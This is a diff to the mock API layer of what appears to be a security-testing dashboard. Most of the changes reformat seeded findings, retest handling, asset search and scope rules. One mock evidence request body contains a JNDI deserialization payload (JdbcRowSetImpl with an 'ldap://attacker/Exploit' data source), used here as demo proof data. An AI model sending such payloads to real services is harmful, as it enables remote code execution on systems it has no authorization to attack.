@@ -68,20 +68,72 @@ interface MockBindingSeed {
 // Seed finding-ID-to-traffic bindings with requests appropriate to each vulnerability,
 // making the demo evidence section representative.
 const mockFindingTrafficSeeds: Record<string, MockBindingSeed[]> = {
-  "f-1": [{ traffic_id: "x-2", role: "proof", get note() { return swt("interface.m2762"); } }],
+  "f-1": [
+    {
+      traffic_id: "x-2",
+      role: "proof",
+      get note() {
+        return swt("interface.m2762");
+      },
+    },
+  ],
   "f-2": [
-    { traffic_id: "x-8", role: "baseline", get note() { return swt("interface.m2763"); } },
-    { traffic_id: "x-9", role: "proof", get note() { return swt("interface.m2764"); } },
+    {
+      traffic_id: "x-8",
+      role: "baseline",
+      get note() {
+        return swt("interface.m2763");
+      },
+    },
+    {
+      traffic_id: "x-9",
+      role: "proof",
+      get note() {
+        return swt("interface.m2764");
+      },
+    },
   ],
   "f-12": [
-    { traffic_id: "x-15", role: "proof", get note() { return swt("interface.m2765"); } },
-    { traffic_id: "x-16", role: "verification", get note() { return swt("interface.m2766"); } },
+    {
+      traffic_id: "x-15",
+      role: "proof",
+      get note() {
+        return swt("interface.m2765");
+      },
+    },
+    {
+      traffic_id: "x-16",
+      role: "verification",
+      get note() {
+        return swt("interface.m2766");
+      },
+    },
   ],
   "f-15": [
-    { traffic_id: "x-17", role: "baseline", get note() { return swt("interface.m2767"); } },
-    { traffic_id: "x-18", role: "proof", get note() { return swt("interface.m2768"); } },
+    {
+      traffic_id: "x-17",
+      role: "baseline",
+      get note() {
+        return swt("interface.m2767");
+      },
+    },
+    {
+      traffic_id: "x-18",
+      role: "proof",
+      get note() {
+        return swt("interface.m2768");
+      },
+    },
   ],
-  "f-17": [{ traffic_id: "x-19", role: "proof", get note() { return swt("interface.m2769"); } }],
+  "f-17": [
+    {
+      traffic_id: "x-19",
+      role: "proof",
+      get note() {
+        return swt("interface.m2769");
+      },
+    },
+  ],
 };
 
 // Fixed demo message bodies keep Request/Response details populated.
@@ -93,7 +145,9 @@ const mockEvidenceBodies: Record<string, { req: string; resp: string }> = {
   "x-8": { req: "", resp: '{"order_id":1001,"user_id":42,"amount":199.00}' },
   "x-9": {
     req: "",
-    get resp() { return swt("interface.m2770"); },
+    get resp() {
+      return swt("interface.m2770");
+    },
   },
   "x-15": {
     req: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}',
@@ -181,8 +235,7 @@ function advanceMockRetests() {
     retest.status = "completed";
     retest.verdict = "inconclusive";
     retest.summary = swt("interface.m2771");
-    retest.evidence =
-      swt("interface.m2772");
+    retest.evidence = swt("interface.m2772");
     retest.finished_at = new Date().toISOString();
     mockRetestMessages[retest.conversation_id].push({
       seq: 3,
@@ -1024,14 +1077,24 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
         label: finding.name || finding.vulnclass,
         description: `${finding.severity} · ${finding.summary}`,
       })),
-      ...D.companies.map((company) => ({ kind: "company", id: company.id, label: company.name, description: swt("interface.m0217") })),
+      ...D.companies.map((company) => ({
+        kind: "company",
+        id: company.id,
+        label: company.name,
+        description: swt("interface.m0217"),
+      })),
       ...D.assets.map((asset) => ({
         kind: asset.type,
         id: asset.id,
         label:
           asset.type === "endpoint"
             ? `${asset.method || "GET"} ${asset.url}`
-            : asset.app_name || asset.url || asset.domain || asset.ip || asset.bundle_id || swt("interface.m2801", { p0: asset.id }),
+            : asset.app_name ||
+              asset.url ||
+              asset.domain ||
+              asset.ip ||
+              asset.bundle_id ||
+              swt("interface.m2801", { p0: asset.id }),
         description: [asset.type, asset.page_title, asset.service_name, asset.bundle_id, asset.ip]
           .filter(Boolean)
           .join(" · "),
@@ -1156,7 +1219,9 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
         byID.set(id, { id, ok: false, queued: false, error: (error as Error).message });
       }
     }
-    return { items: requested.map((id) => byID.get(id) ?? { id, ok: false, queued: false, error: swt("interface.m2774") }) };
+    return {
+      items: requested.map((id) => byID.get(id) ?? { id, ok: false, queued: false, error: swt("interface.m2774") }),
+    };
   }
   if (seg[0] === "tasks" && seg[2] === "archive" && seg.length === 3 && m === "POST") {
     return publicMockTaskArchive(mockArchiveTask(seg[1]));
@@ -1541,9 +1606,14 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     else if (kind === "root_domain" || kind === "subdomain") row.domain = value.toLowerCase();
     else if (kind === "ip" || kind === "cidr") row.net = value;
     else row.value = value;
-    const existing = current.find((entry) => entry.kind === kind &&
-      entry.company_id === row.company_id && entry.domain === row.domain &&
-      entry.net === row.net && entry.value === row.value);
+    const existing = current.find(
+      (entry) =>
+        entry.kind === kind &&
+        entry.company_id === row.company_id &&
+        entry.domain === row.domain &&
+        entry.net === row.net &&
+        entry.value === row.value,
+    );
     if (existing) {
       if (!existing.operator_authorized) Object.assign(existing, row, { id: existing.id });
       return existing;
@@ -1667,7 +1737,8 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
       const rules: CompanyScopeRule[] = b.scope.map((candidate, index) => {
         if (typeof candidate === "string") {
           const issue = classifyCompanyScopeLine(candidate, index + 1);
-          if (!issue.rule || issue.error) throw new Error(swt("interface.m2812", { p0: index + 1, p1: issue.error ?? swt("interface.m2813") }));
+          if (!issue.rule || issue.error)
+            throw new Error(swt("interface.m2812", { p0: index + 1, p1: issue.error ?? swt("interface.m2813") }));
           return issue.rule;
         }
         const item = candidate as { kind?: unknown; value?: unknown };
@@ -2235,8 +2306,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
   if (path === "/settings" && m === "PUT") return { ...D.settings, ...b };
   if (path === "/settings/web-search/test") return { ok: true, count: 5, backend: D.settings.web_search_backend };
   if (path === "/settings/python/detect") return { python_interpreter: "/usr/bin/python3" };
-  if (path === "/chat")
-    return { reply: swt("interface.m2830"), mode: "hint" };
+  if (path === "/chat") return { reply: swt("interface.m2830"), mode: "hint" };
   if (path === "/gc") return { removed: 0 };
 
   // Tool execution history.
@@ -2442,11 +2512,14 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
   if (path === "/intercept/history" || (seg[0] === "intercept" && seg[1] === "task")) {
     const status = q.get("status") || "";
     const decisionSource = q.get("decision_source") || "";
-    if (status && !["pending", "allowed", "denied", "timeout"].includes(status)) throw new Error(swt("interface.m2839"));
-    if (decisionSource && !["model", "rule", "unknown"].includes(decisionSource)) throw new Error(swt("interface.m2840"));
+    if (status && !["pending", "allowed", "denied", "timeout"].includes(status))
+      throw new Error(swt("interface.m2839"));
+    if (decisionSource && !["model", "rule", "unknown"].includes(decisionSource))
+      throw new Error(swt("interface.m2840"));
     const filtered = mockInterceptHistory.filter((row) => {
       const source =
-        row.decision_source || (row.rule_id ? "rule" : row.reason?.startsWith(swt("interface.m2044")) ? "model" : "unknown");
+        row.decision_source ||
+        (row.rule_id ? "rule" : row.reason?.startsWith(swt("interface.m2044")) ? "model" : "unknown");
       return (
         (seg[1] !== "task" || row.task_id === decodeURIComponent(seg[2])) &&
         (!status || row.status === status) &&
